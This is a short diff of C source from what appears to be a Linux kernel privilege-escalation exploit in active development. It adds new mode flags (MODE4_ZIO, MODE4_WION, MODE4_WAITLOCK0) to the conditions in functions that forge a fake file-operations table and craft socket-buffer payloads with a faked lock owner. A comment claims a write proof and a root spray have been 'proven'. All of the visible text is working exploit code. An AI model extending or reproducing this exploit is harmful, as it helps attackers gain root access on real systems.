@@ -426,6 +426,9 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
                 env_flag("MODE4_ROOT_SPRAY", 0) ||
                 env_flag("MODE4_CHAIN", 0) ||
                 env_flag("MODE4_ZI", 0) ||
+                env_flag("MODE4_ZIO", 0) ||
+                env_flag("MODE4_WION", 0) ||
+                env_flag("MODE4_WAITLOCK0", 0) ||
                 env_flag("MODE4_ZION", 0) ||
                 env_flag("MODE4_ARISTOTLE", 0) ||
                 env_flag("MODE4_WRITE_PROOF", 0) ||
@@ -861,7 +864,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                 env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0))) {
       /*
        * owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase, skip fake_task
-       * setprio. bootid write-proof proven with this.
+       * setprio. bootid write-proof + ROOT_SPRAY proven with this.
        */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -872,6 +875,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                (env_flag("MODE4_LOCK_OWNER0", 0) ||
                 env_flag("MODE4_ZION", 0) ||
                 env_flag("MODE4_ZI", 0) ||
+                env_flag("MODE4_ZIO", 0) ||
+                env_flag("MODE4_WION", 0) ||
+                env_flag("MODE4_WAITLOCK0", 0) ||
                 env_flag("MODE4_CHAIN", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
                 env_flag("MODE4_ION_ROOT", 0) ||
@@ -965,6 +971,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
              env_flag("MODE4_ZERO_OWNER", 0) ||
              env_flag("MODE4_CHAIN", 0) ||
              env_flag("MODE4_ZI", 0) ||
+             env_flag("MODE4_ZIO", 0) ||
+             env_flag("MODE4_WION", 0) ||
+             env_flag("MODE4_WAITLOCK0", 0) ||
              env_flag("MODE4_ION_SAFE", 0) ||
              env_flag("MODE4_ION_ROOT", 0) ||
              env_flag("MODE4_ROOT_SPRAY", 0) ||
